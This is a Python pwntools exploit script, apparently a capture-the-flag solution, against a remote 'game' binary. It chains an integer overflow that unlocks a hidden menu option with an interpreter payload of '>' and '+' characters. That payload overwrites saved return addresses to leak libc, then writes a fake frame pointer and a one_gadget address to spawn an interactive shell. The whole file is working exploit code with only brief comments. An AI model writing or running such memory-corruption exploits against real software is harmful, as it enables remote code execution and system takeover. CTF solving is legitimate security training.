#!/usr/bin/env python3

# https://www.gnu.org/software/autoconf/manual/autoconf-2.60/html_node/Integer-Overflow.html

from pwn import *

exe = ELF("./game_patched")
libc = ELF("./libc.so.6")
context.binary = exe

# p = process(exe.path)
p = remote("20.121.188.64", 31337)

################################
### Stage 1: Enable option 3 ###
################################
p.sendlineafter(b'choice: ', b'1')
p.sendafter(b'string: ', b'\x01'*0x7ff)
p.sendafter(b'number: ', str(0x80000000).encode() + b'\n')
p.sendafter(b'number: ', str(0xffffffff).encode() + b'\n')


##################################
### Stage 2: Leak libc address ###
##################################
p.sendlineafter(b'choice: ', b'3')

# saved rip of lang_interpreter -> printf of play_game
# 0x00555555555846              -> 0x005555555554fd
payload = b'>'*0x98
payload += b'+'*0xb7
payload += b'>'
payload += b'-'*0x4

# saved rbp of run() -> saved rbp which has saved rip is main
# 0x007fffffffdfd0   -> 0x007fffffffdfe0
payload += b'>'*(7 + 0x10)
payload += b'+'*0x10

# saved rip of run() -> puts of play_game
# 0x0055555555592a   -> 0x005555555554ac
payload += b'>'*0x8
payload += b'+'*0x82
payload += b'>'
payload += b'-'*0x5

# change main      -> main + 5
# 0x0055555555586d -> 0x00555555555872
payload += b'>'*(7+0x38)
payload += b'+'*0x5

p.sendlineafter(b'code: ', payload)

p.recvline()
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x620d0
log.info("Libc leak: " + hex(libc_leak))
log.info("Libc base: " + hex(libc.address))


##########################
### Stage 3: Get shell ###
##########################
p.sendlineafter(b'choice: ', b'3')

payload = b''
# Write fake saved rbp
for i in range(0, 48, 8):
    payload += b'+'*( ((libc.address + 0x21a000) >> i) & 0xff)
    payload += b'>'
payload += b'>'*2

# Write one_gadget
libc.sym['one_gadget'] = libc.address + 0xebcf8
for i in range(0, 48, 8):
    payload += b'+'*( (libc.sym['one_gadget'] >> i) & 0xff)
    payload += b'>'
payload += b'>'*2

# saved rbp of lang_interpreter() -> fake saved rbp
# 0x007fffffffdfc0                -> 0x007fffffffdf10
payload += b'>'*0x80
payload += b'-'*0xb0

# set rdx to null, move backward to the null byte of canary
payload += b'<'*8
payload += b'+-'

p.sendlineafter(b'code: ', payload)

p.interactive()